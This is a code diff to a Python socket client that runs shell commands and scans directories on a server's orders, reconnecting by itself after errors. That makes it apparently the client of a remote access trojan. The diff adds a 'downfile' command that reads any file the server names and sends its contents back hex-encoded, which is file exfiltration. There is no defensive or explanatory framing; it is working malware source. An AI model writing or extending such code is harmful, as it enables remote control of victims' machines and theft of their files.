@@ -1,7 +1,10 @@
 import socket
+import base64
 import json
 import time
 import os
+
+from pydantic import DecimalIsNotFiniteError
 
 # Send dynamic length socket data
 def send_dyn_socket(server, content):
@@ -42,6 +45,17 @@ def scan_dir(server, path): # Scan directory
     send_dyn_socket(server, entire_dir)
 
 
+def download_file(server, filepath):
+    if os.path.exists(filepath):
+        print(filepath)
+        buf = bytearray(os.path.getsize(filepath))
+        with open(filepath, 'rb') as file:
+            file.readinto(buf)
+        print(buf)
+        send_dyn_socket(server, buf.hex())
+    else:
+        send_dyn_socket(server, 'File does not exists')
+
 
 def tcpClient(client):
     while True:
@@ -55,6 +69,8 @@ def tcpClient(client):
                     exec_shell(client, json_data['content'])
                 case 'scandir':
                     scan_dir(client, json_data['content'])
+                case 'downfile':
+                    download_file(client, json_data['content'])
         except:
             client.close()
             connect()
